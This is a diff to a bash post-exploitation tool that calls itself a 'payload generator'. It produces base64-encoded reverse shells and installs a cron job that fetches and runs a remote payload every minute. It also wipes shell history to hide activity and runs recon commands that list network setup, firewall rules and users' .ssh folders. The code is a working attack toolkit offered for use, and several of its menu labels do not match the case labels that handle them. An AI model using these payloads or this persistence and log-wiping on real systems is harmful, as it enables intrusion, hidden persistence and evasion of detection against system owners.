@@ -35,11 +35,11 @@ function genpayload() {
 				echo "nohup echo \"${encode}\" | base64 -d | bash &" > .shell.sh
 				chmod +x .shell.sh
 				echo -e "Payload saved as `pwd`/.shell.sh"
-				read -r -p "Press enter to continue"
+				read -p "Press enter to continue"
 		}
 
 		PS3="Select Reverse Shell payload: "
-		options=("Reverse Netcat Shell" "Reverse Bash Shell" "Reverse Python Shell" "Reverse PHP Shell" "Reverse Ruby Shell" "Reverse Perl Shell" "Quit")
+		options=("Reverse Netcat Shell" "Reverse Bash Shell" "Reverse Python Shell" "Reverse PHP Shell" "Reverse Ruby Shell" "Reverse Perl Shell" "Return to main menu")
 		select opt in "${options[@]}"
 		do
 
@@ -69,8 +69,8 @@ function genpayload() {
 					shell=${payloads[5]}
 					encshell
 					;;
-				"Quit")
-					break
+				"Return to main menu")
+					return 1
 					;;
 				*) echo "invalid option $REPLY";;
 			esac
@@ -83,8 +83,44 @@ function cron() {
 		read -r -p "Enter server and payload file name for payload dropper (example http://server.com/shell.sh): " server
 		read -r -p "Enter name of payload to be executed: " payload
 		cronjob="* * * * * wget $server ; sh $payload"
-		( crontab -l | grep -v -F "$server" ; echo "$cronjob" ) | crontab -
+		clear
+
+		function command() {
 		
+				echo "( crontab -l | grep -v -F \"$server\" ; echo \"$cronjob\" ) | crontab -" > command.txt
+				echo -e "\ncommand saved as command.txt\n"
+				echo -e "command:"
+				cat command.txt
+				echo -e "\n"
+				read -p "Press enter to continue"
+		}
+
+		function add2sys() {
+		
+				( crontab -l | grep -v -F "$server" ; echo "$cronjob" ) | crontab -
+				echo -e "\nAdded cron job to crontab\n"
+				read -p "Press enter to continue"
+
+		}
+		PS3="Generate cron job payload dropper command or add cron job to this machine: "
+		options=("Generate crontab command to download and payload every minute" "Add cronjob to this system to download and execute payload every minute"  "Return to  main menu")
+		select opt in "${options[@]}"
+		do
+			case $opt in
+				"Generate crontab command to download payload every minute")
+					command
+					;;
+				"Add cron job to this system to download and execute every minute")
+					add2sys
+					;;
+				"Return to main menu")
+					return 1
+					;;
+				*) echo "invalid option $REPLY";;
+			esac
+			return 1
+		done
+
 }
 
 function clearlog() {
@@ -93,7 +129,7 @@ function clearlog() {
 		export HISTFILE=
 		unset HISTFILE
 		rm -rf ~/.bash_history && ln -s ~/.bash_history /dev/null
-		> ~/.bash_history
+		touch ~/.bash_history
 		zsh% unset HISTFILE HISTSIZE
 		tcsh% set history=0
 		bash$ set +o history
@@ -109,20 +145,20 @@ function info() {
 		declare -a post=(
 
 		"hostname -f;"
-		"ip addr show;"	
+		"ip addr show;"
 		"ip ro show"
-		"ifconfig -a"	
+		"ifconfig -a"
 		"route -n"
-		"cat /etc/network/interfaces"	
+		"cat /etc/network/interfaces"
 		"iptables -L -n -v"	
-		"iptables -t nat -L -n -v"	
+		"iptables -t nat -L -n -v"
 		"ip6tables -L -n -v"
 		"iptables-save"
-		"netstat -anop"	
+		"netstat -anop"
 		"netstat -r"
 		"netstat -nltupw"
-		"arp -a"	
-		"lsof -nPi"	
+		"arp -a"
+		"lsof -nPi"
 		"cat /proc/net/"
 		"ls -alh /home/*/"
 		"ls -alh /home/*/.ssh/"
@@ -164,7 +200,7 @@ function info() {
 		do
 			echo ${post[$i-1]} | sh || true
 		done
-		read -r -p "Press enter to continue"
+		read -p "Press enter to continue"
 		clear
 		return 1
 
@@ -196,7 +232,7 @@ dialog --clear --nocancel --backtitle "Coded by d4rkst4t1c.." \
 --menu "Linux post exploitation framework and payload generator." 15 60 6 \
 Payloads "Generate Reverse Shells" \
 Crontab "Add cron job for persistence" \
-Clearlogs "Clear all logs" \
+Clearlogs "Clear all logs (root)" \
 MassinfoGrab "Gain recon on the system" \
 BanIP "Ban an IP Address" \
 Exit "" 2>"${INPUT}"
